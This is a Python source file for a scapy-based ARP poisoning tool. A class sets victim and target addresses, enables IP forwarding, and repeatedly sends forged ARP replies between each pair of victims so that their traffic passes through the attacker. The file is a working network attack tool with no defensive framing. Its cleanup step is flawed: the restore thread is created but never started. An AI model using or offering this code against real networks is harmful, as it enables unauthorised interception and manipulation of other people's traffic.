import threading
import time

from tkinter import messagebox
from scapy.all import *
from scapy.layers.l2 import ARP


class ArpPois:
    def __init__(self):
        self.victims_ip = None
        self.victims_mac = None
        self.target_ip = None
        self.target_mac = None
        self.stop = False
        self.thread = None
        self.stop_thread = None
        self.sleep_time = 5

    def set_victims(self, victims_ip, victims_mac):
        self.victims_ip = victims_ip
        self.victims_mac = victims_mac

    def set_target(self, target_ip, target_mac):
        self.target_ip = target_ip
        self.target_mac = target_mac

    def set_time(self, sleep):
        self.sleep_time = int(sleep)

    def poison(self, ip2, ip, mac2, mac):
        send(ARP(op=2, pdst=ip2, psrc=ip, hwdst=mac2, hwsrc=self.target_mac))
        send(ARP(op=2, pdst=ip, psrc=ip2, hwdst=mac, hwsrc=self.target_mac))

    @staticmethod
    def restore(ip2, ip, mac2, mac):
        send(ARP(op=2, pdst=ip, psrc=ip2, hwdst=mac, hwsrc=mac2), count=3)
        send(ARP(op=2, pdst=ip2, psrc=ip, hwdst=mac2, hwsrc=mac), count=3)

    def run(self):
        try:
            with open('/proc/sys/net/ipv4/ip_forward', 'w') as ipf:
                ipf.write('1\n')
        except FileNotFoundError:
            pass
            # messagebox.showerror(
            #     "Error", "Please use a Linux system.")

        while not self.stop:
            for ip, mac in zip(self.victims_ip, self.victims_mac):
                for ip2, mac2 in zip(self.victims_ip, self.victims_mac):
                    if ip != ip2:
                        self.poison(ip2, ip, mac2, mac)
            time.sleep(self.sleep_time)

    def start_poisoning(self):
        self.stop = False
        self.thread = threading.Thread(target=self.run)
        self.thread.start()

    def stop_poisoning(self):
        self.stop = True

        try:
            with open('/proc/sys/net/ipv4/ip_forward', 'w') as ipf:
                ipf.write('0\n')
        except FileNotFoundError:
            pass

        self.stop_thread = threading.Thread(target=self.restore_network)

    def restore_network(self):
        for ip, mac in zip(self.victims_ip, self.victims_mac):
            for ip2, mac2 in zip(self.victims_ip, self.victims_mac):
                if ip != ip2:
                    self.restore(ip2, ip, mac2, mac)
